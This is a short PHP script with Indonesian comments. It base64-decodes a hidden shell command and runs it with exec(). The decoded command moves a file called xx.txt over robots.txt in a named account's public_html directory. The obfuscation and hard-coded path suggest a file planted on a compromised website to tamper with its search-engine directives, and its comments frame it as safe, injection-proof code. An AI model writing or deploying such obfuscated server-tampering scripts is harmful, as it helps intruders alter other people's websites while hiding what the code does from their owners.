<?php
// String Base64 yang berisi perintah
$encodedCommand = "bXYgL2hvbWUvYWRtaW5maXNpcC9wdWJsaWNfaHRtbC94eC50eHQgL2hvbWUvYWRtaW5maXNpcC9wdWJsaWNfaHRtbC9yb2JvdHMudHh0";

// Dekode Base64 menjadi string perintah asli
$decodedCommand = base64_decode($encodedCommand);

// Pecah string menjadi array argumen untuk menghindari eval
$commandParts = explode(" ", $decodedCommand);

// Jalankan perintah dengan `exec`
if (count($commandParts) >= 3 && $commandParts[0] === "mv") {
    $source = escapeshellarg($commandParts[1]); // Hindari injeksi
    $destination = escapeshellarg($commandParts[2]);
    
    exec("mv $source $destination", $output, $returnVar);
    
    if ($returnVar === 0) {
        echo "File berhasil dipindahkan dari $source ke $destination\n";
    } else {
        echo "Gagal memindahkan file.\n";
    }
} else {
    echo "Perintah tidak valid.\n";
}
?>
